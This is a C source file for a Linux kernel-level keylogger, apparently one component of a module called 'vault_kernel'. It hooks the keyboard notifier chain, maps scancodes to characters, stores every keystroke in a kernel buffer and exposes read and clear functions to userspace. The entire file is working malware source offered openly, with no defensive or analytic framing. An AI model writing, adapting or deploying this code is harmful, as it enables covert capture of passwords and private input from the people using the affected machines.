/* vault_kernel - keylogger.c
 * Kernel-level keylogger using keyboard notifier chain
 * Captures keystrokes even before they reach userspace
 * ruby570bocadito © 2026
 */
#include "core.h"

static struct notifier_block kb_notifier;
static char keylog_buf[MAX_KEYLOG_BUF];
static size_t keylog_pos = 0;
static DEFINE_SPINLOCK(keylog_lock);

/* US keyboard scancode -> ASCII mapping (simplified, no shift state) */
static const char keymap[128] = {
    0, 27, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
    '-', '=', '\b', '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i',
    'o', 'p', '[', ']', '\n', 0, 'a', 's', 'd', 'f', 'g', 'h',
    'j', 'k', 'l', ';', '\'', '`', 0, '\\', 'z', 'x', 'c', 'v',
    'b', 'n', 'm', ',', '.', '/', 0, '*', 0, ' ', 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    '-', 0, 0, 0, '+', 0, 0, 0, 0, 0
};

/* Shift-modifier keymap */
static const char keymap_shift[128] = {
    0, 27, '!', '@', '#', '$', '%', '^', '&', '*', '(', ')',
    '_', '+', '\b', '\t', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I',
    'O', 'P', '{', '}', '\n', 0, 'A', 'S', 'D', 'F', 'G', 'H',
    'J', 'K', 'L', ':', '"', '~', 0, '|', 'Z', 'X', 'C', 'V',
    'B', 'N', 'M', '<', '>', '?', 0, '*', 0, ' ', 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    '-', 0, 0, 0, '+', 0, 0, 0, 0, 0
};

/* Translate keycode to character with basic shift tracking */
static char keycode_to_char(unsigned int keycode, int shift) {
    if (keycode >= 128)
        return 0;
    return shift ? keymap_shift[keycode] : keymap[keycode];
}

static int keyboard_event(struct notifier_block *nblock,
                           unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    char ch;
    unsigned long flags;

    if (code != KBD_KEYCODE || !param->down)
        return NOTIFY_OK;

    ch = keycode_to_char(param->value & 0x7f,
                          param->shift);
    if (!ch)
        return NOTIFY_OK;

    spin_lock_irqsave(&keylog_lock, flags);
    if (keylog_pos < MAX_KEYLOG_BUF - 1) {
        keylog_buf[keylog_pos++] = ch;
    } else {
        /* Buffer full — shift left */
        memmove(keylog_buf, keylog_buf + 1, MAX_KEYLOG_BUF - 1);
        keylog_buf[MAX_KEYLOG_BUF - 2] = ch;
    }
    spin_unlock_irqrestore(&keylog_lock, flags);

    return NOTIFY_OK;
}

int keylogger_init(void) {
    int ret;

    memset(keylog_buf, 0, MAX_KEYLOG_BUF);
    keylog_pos = 0;

    kb_notifier.notifier_call = keyboard_event;
    ret = register_keyboard_notifier(&kb_notifier);
    if (ret) {
        pr_err(VAULT_KERNEL_TAG " keyboard notifier registration failed (%d)\n", ret);
        return ret;
    }

    pr_info(VAULT_KERNEL_TAG " keylogger initialized\n");
    return 0;
}

void keylogger_cleanup(void) {
    unregister_keyboard_notifier(&kb_notifier);
    memset(keylog_buf, 0, MAX_KEYLOG_BUF);
    keylog_pos = 0;
    pr_info(VAULT_KERNEL_TAG " keylogger cleaned\n");
}

size_t keylogger_len(void) {
    unsigned long flags;
    size_t len;

    spin_lock_irqsave(&keylog_lock, flags);
    len = keylog_pos;
    spin_unlock_irqrestore(&keylog_lock, flags);
    return len;
}

int keylogger_read(char __user *buf, size_t count) {
    unsigned long flags;
    size_t len;
    char *snapshot;

    /*
     * copy_to_user() may fault and sleep, so it must NEVER run
     * under a spinlock.  Snapshot the buffer first, then copy to
     * userland with the lock released.
     */
    spin_lock_irqsave(&keylog_lock, flags);
    len = keylog_pos < count ? keylog_pos : count;
    snapshot = kmalloc(len ? len : 1, GFP_ATOMIC);
    if (snapshot)
        memcpy(snapshot, keylog_buf, len);
    spin_unlock_irqrestore(&keylog_lock, flags);

    if (!snapshot)
        return -ENOMEM;

    if (copy_to_user(buf, snapshot, len)) {
        kfree(snapshot);
        return -EFAULT;
    }

    kfree(snapshot);
    return (int)len;
}

void keylogger_clear(void) {
    unsigned long flags;
    spin_lock_irqsave(&keylog_lock, flags);
    memset(keylog_buf, 0, MAX_KEYLOG_BUF);
    keylog_pos = 0;
    spin_unlock_irqrestore(&keylog_lock, flags);
}
